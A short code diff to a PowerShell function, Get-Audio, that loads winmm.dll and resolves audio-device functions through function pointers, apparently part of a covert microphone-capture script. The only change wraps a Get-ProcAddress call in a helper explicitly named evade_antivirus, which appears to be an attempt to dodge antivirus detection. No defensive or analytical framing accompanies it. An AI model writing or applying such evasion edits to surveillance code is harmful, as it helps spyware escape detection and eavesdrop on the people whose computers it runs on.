@@ -57,7 +57,8 @@ function Get-Audio {
 	$HND = $LoadLibrary.Invoke('winmm.dll')
 	if($HND -eq $null){Throw 'Failed to aquire handle to winmm.dll'}
 	$waveInGetNumDevsAddr = $null
-	$waveInGetNumDevsAddr = Get-ProcAddress winmm.dll waveInGetNumDevs
+	function evade_antivirus {return Get-ProcAddress winmm.dll waveInGetNumDevs}
+	$waveInGetNumDevsAddr = evade_antivirus
 	$waveInGetNumDevsDelegate = Get-DelegateType @() ([Uint32])
 	if($waveInGetNumDevsAddr -eq $null){Throw 'Failed to aquire address to WaveInGetNumDevs'}
 	$waveInGetNumDevs = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($waveInGetNumDevsAddr, $waveInGetNumDevsDelegate)
